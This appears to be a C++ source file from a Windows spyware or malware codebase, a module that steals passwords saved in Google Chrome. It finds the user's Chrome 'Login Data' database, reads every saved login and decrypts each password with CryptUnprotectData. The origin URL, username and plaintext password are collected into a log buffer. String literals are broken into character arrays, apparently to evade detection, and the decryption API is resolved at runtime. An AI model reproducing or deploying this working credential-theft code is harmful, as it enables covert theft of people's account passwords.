#include <Windows.h>

#include "globals.h"
#include "zmem.h"
#include "utils.h"
#include "sqlite.h"
#include "password.h"
#include "chrome_password.h"
#include "debug.h"

extern CryptUnprotectData_t fpCryptUnprotectData;

LPWSTR GetChromeProfilePath()
{
	WCHAR strFormat[] = { L'%', L's', L'\\', L'G', L'o', L'o', L'g', L'l', L'e', L'\\', L'C', L'h', L'r', L'o', L'm', L'e', L'\\', L'U', L's', L'e', L'r', L' ', L'D', L'a', L't', L'a', L'\\', L'D', L'e', L'f', L'a', L'u', L'l', L't', L'\0' };
	LPWSTR strPath = (LPWSTR) zalloc((MAX_FILE_PATH+1)*sizeof(WCHAR));
	if (!SHGetSpecialFolderPath(NULL, strPath, CSIDL_LOCAL_APPDATA, FALSE))
		return NULL;

	LPWSTR strFullPath = (LPWSTR) zalloc((MAX_FILE_PATH+1)*sizeof(WCHAR));
	_snwprintf_s(strFullPath, MAX_FILE_PATH, _TRUNCATE, strFormat, strPath);  //FIXME: array
	
	LPWSTR strShortPath = (LPWSTR) zalloc((MAX_FILE_PATH+1)*sizeof(WCHAR));
	if (!GetShortPathName(strFullPath, strShortPath, MAX_FILE_PATH) || !PathFileExists(strShortPath))
	{
		zfree(strShortPath);
		strShortPath = NULL;
	}

	zfree(strPath);
	zfree(strFullPath);

	return strShortPath;
}

LPSTR GetChromeProfilePathA()
{
	LPWSTR strProfilePath = GetChromeProfilePath();
	LPSTR strProfilePathA = (LPSTR) zalloc(MAX_FILE_PATH+1);
	_snprintf_s(strProfilePathA, MAX_FILE_PATH, _TRUNCATE, "%S", strProfilePath);
	zfree(strProfilePath);
	
	if (PathFileExistsA(strProfilePathA))
		return strProfilePathA;

	zfree(strProfilePathA);
	return NULL;
}

LPWSTR DecryptChromePass(LPBYTE strCryptData)
{
	DWORD dwBlobSize;
	DATA_BLOB pDataIn, pDataOut;

	pDataOut.pbData = 0;
	pDataOut.cbData = NULL;
	pDataIn.pbData = strCryptData;

	for (dwBlobSize=128; dwBlobSize<=2048; dwBlobSize+=16)
	{
		pDataIn.cbData = dwBlobSize;
		if (fpCryptUnprotectData == NULL)
			if (!ChromePasswordResolveApi())
				return NULL;

		if (fpCryptUnprotectData(&pDataIn, NULL, NULL, NULL, NULL, 0, &pDataOut))
			break;
	}

	if (dwBlobSize >= 2048)
		return NULL;

	LPWSTR strClearData = (LPWSTR) zalloc((pDataOut.cbData+1)*sizeof(WCHAR));
	if (!strClearData)
	{
		LocalFree(pDataOut.pbData);
		return NULL;
	}
	_snwprintf_s(strClearData, pDataOut.cbData+1, _TRUNCATE, L"%S", pDataOut.pbData);

	LocalFree(pDataOut.pbData);
	return strClearData;
}

int ParseChromeSQLPasswords(LPVOID lpReserved, int dwColumns, LPSTR *strValues, LPSTR *strNames)
{
	LPWSTR strResource = NULL; 
	LPWSTR strUser = NULL; // (LPWSTR) zalloc(1024*sizeof(WCHAR));
	LPWSTR strPass = NULL; // (LPWSTR) zalloc(1024*sizeof(WCHAR));

	CHAR strOrigin[] = { 'o', 'r', 'i', 'g', 'i', 'n', '_', 'u', 'r', 'l', 0x0 };
	CHAR strUserVal[] = { 'u', 's', 'e', 'r', 'n', 'a', 'm', 'e', '_', 'v', 'a', 'l', 'u', 'e', 0x0 };
	CHAR strPassVal[] = { 'p', 'a', 's', 's', 'w', 'o', 'r', 'd', '_', 'v', 'a', 'l', 'u', 'e', 0x0 };

	for (DWORD i=0; i<dwColumns; i++)
	{
		if (!strNames[i])
			continue;

		if (!strcmp(strNames[i], strOrigin))
		{
			strResource = (LPWSTR) zalloc(1024*sizeof(WCHAR)); 
			_snwprintf_s(strResource, 1024, _TRUNCATE, L"%S", strValues[i]);
		}
		else if (!strcmp(strNames[i], strUserVal))
		{
			strUser = (LPWSTR) zalloc(1024*sizeof(WCHAR)); 
			_snwprintf_s(strUser, 1024, _TRUNCATE, L"%S", strValues[i]);
		}
		else if (!strcmp(strNames[i], strPassVal))
			strPass = DecryptChromePass((LPBYTE)strValues[i]);
	}

	if (strResource && strUser && strPass && wcslen(strResource) && wcslen(strUser))
	{
		LPCONTAINER lpContainer = (LPCONTAINER) lpReserved;
		WCHAR strChrome[] = { L'C', L'h', L'r', L'o', L'm', L'e', L'\0' };
		PasswordLogEntry(strChrome, strResource, strUser, strPass, lpContainer->lpBuffer, lpContainer->dwBuffSize);	
	}

	zfree(strResource);
	zfree(strUser);
	zfree(strPass);
	return 0;
}

VOID DumpChromeSQLPasswords(LPBYTE *lpBuffer, LPDWORD dwBuffSize)
{
	LPSTR strProfilePath = GetChromeProfilePathA();
	if (!strProfilePath)
		return;

	DWORD dwSize = strlen(strProfilePath)+1024;
	LPSTR strFilePath = (LPSTR) zalloc(dwSize);
	CHAR strFileName[] = { 'L', 'o', 'g', 'i', 'n', ' ', 'D', 'a', 't', 'a', 0x0 };
	_snprintf_s(strFilePath, dwSize, _TRUNCATE, "%s\\%s", strProfilePath, strFileName);

	sqlite3 *lpDb = NULL;
	if (sqlite3_open((const char *)strFilePath, &lpDb) == SQLITE_OK)
	{
		CONTAINER pContainer;
		pContainer.lpBuffer = lpBuffer;
		pContainer.dwBuffSize = dwBuffSize;

		sqlite3_busy_timeout(lpDb, 5000); // FIXME
#ifdef _DEBUG
		LPSTR strErr;
		if (sqlite3_exec(lpDb, "SELECT * FROM logins;", ParseChromeSQLPasswords, &pContainer, &strErr) != SQLITE_OK) // FIXME: char array
		{
			OutputDebug(L"[!!] Querying sqlite3 for chrome passwords: %S\n", strErr);
			zfree(strErr);
		}
#else
		CHAR strQuery[] = { 'S', 'E', 'L', 'E', 'C', 'T', ' ', '*', ' ', 'F', 'R', 'O', 'M', ' ', 'l', 'o', 'g', 'i', 'n', 's', ';', 0x0 };
		sqlite3_exec(lpDb, strQuery, ParseChromeSQLPasswords, &pContainer, NULL); // FIXME: char array
#endif
		sqlite3_close(lpDb);
	}
	

	zfree(strFilePath);
	zfree(strProfilePath);
}

BOOL ChromePasswordResolveApi()
{
	WCHAR strCrypt[] = { L'c', L'r', L'y', L'p', L't', L'3', L'2', L'\0' };
	CHAR strCryptUnprotectData[] = { 'C', 'r', 'y', 'p', 't', 'U', 'n', 'p', 'r', 'o', 't', 'e', 'c', 't', 'D', 'a', 't', 'a', 0x0 };

	HMODULE hCrypt = LoadLibrary(strCrypt);
	if (!hCrypt)
		return FALSE;

	fpCryptUnprotectData = (CryptUnprotectData_t) GetProcAddress(hCrypt, strCryptUnprotectData);
	if (!fpCryptUnprotectData)
		return FALSE;

	return TRUE;
}

VOID DumpChromePasswords(LPBYTE *lpBuffer, LPDWORD dwBuffSize)
{
	if (ChromePasswordResolveApi())
		DumpChromeSQLPasswords(lpBuffer, dwBuffSize);
}